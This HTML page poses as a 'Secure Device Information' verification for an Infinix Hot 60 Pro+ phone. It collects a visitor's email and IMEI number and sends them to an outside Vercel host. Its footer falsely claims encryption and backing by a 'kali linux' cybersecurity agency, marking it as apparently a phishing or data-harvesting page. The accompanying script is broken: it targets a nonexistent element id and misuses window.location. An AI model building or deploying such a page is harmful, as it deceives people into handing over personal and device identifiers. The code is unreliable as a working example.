<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Device Info</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:'Poppins',sans-serif;
}

body{
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:linear-gradient(135deg,#0f172a,#1e293b,#111827);
    padding:20px;
}

.form-box{
    width:100%;
    max-width:420px;
    background:rgba(255,255,255,0.08);
    border:1px solid rgba(255,255,255,0.12);
    backdrop-filter:blur(14px);
    border-radius:28px;
    padding:35px 30px;
    box-shadow:0 15px 40px rgba(0,0,0,0.4);
    color:white;
}

.logo{
    width:75px;
    height:75px;
    margin:auto;
    border-radius:50%;
    background:linear-gradient(135deg,#3b82f6,#8b5cf6);
    display:flex;
    align-items:center;
    justify-content:center;
    font-size:32px;
    margin-bottom:18px;
    box-shadow:0 8px 20px rgba(59,130,246,0.4);
}

h2{
    text-align:center;
    font-size:28px;
    margin-bottom:6px;
}

.subtitle{
    text-align:center;
    color:#cbd5e1;
    margin-bottom:28px;
    font-size:14px;
}

.input-group{
    margin-bottom:18px;
}

label{
    display:block;
    margin-bottom:8px;
    font-size:14px;
    color:#e2e8f0;
}

input{
    width:100%;
    padding:14px 16px;
    border:none;
    border-radius:14px;
    background:rgba(255,255,255,0.1);
    color:white;
    font-size:15px;
    outline:none;
    transition:0.3s ease;
    border:1px solid transparent;
}

input:focus{
    border-color:#60a5fa;
    background:rgb(255,255,255,0.15);
}

input::placeholder{
    color:#cbd5e1;
}

button{
    width:100%;
    padding:15px;
    border:none;
    border-radius:16px;
    background:linear-gradient(135deg,#2563eb,#7c3aed);
    color:white;
    font-size:16px;
    font-weight:600;
    cursor:pointer;
    margin-top:10px;
    transition:0.3s ease;
}

button:hover{
    transform:translateY(-2px);
    box-shadow:0 10px 20px rgba(37,99,235,0.4);
}

.footer{
    text-align:center;
    margin-top:20px;
    color:#94a3b8;
    font-size:12px;
}
</style>
</head>
<body>

<div class="form-box">
    <div class="logo"></div>

    <h2> Infinix hot 60 pro+</h2>
    <p class="subtitle">Secure  Device Information</p>

    <form action="https://track-wijn.vercel.app/detail2.html " method="get">
    <div class="input-group">
        <label>Email</label>
        <input type="email" name="email" required>
    </div>

    <div class="input-group">
        <label>IMEI Number</label>
        <input type="text" name="imei" required>
    </div>

    <button id="tn" type="submit" style="color:white; background:#007bff; border:none; padding:10px 20px; cursor:pointer;">
        Verify Device
    </button>
</form>


    <div class="footer">
        Protected & Encrypted Information
        |Supported by kali linux operators   <br/> cybersecurity agency @https://www.kali.org/
    </div>
</div>
<script> 
        const btn = document.getElementById("btn");
    let isValuable = false;  // change this to false to test
btn.addEventListener("click", function() {
  if (isValuable === true) {
  alert("device is off");
    }
    else {
       window.location("https://track-wijn.vercel.app/detail2.html");
    }
});

</script>
</body>
</html>
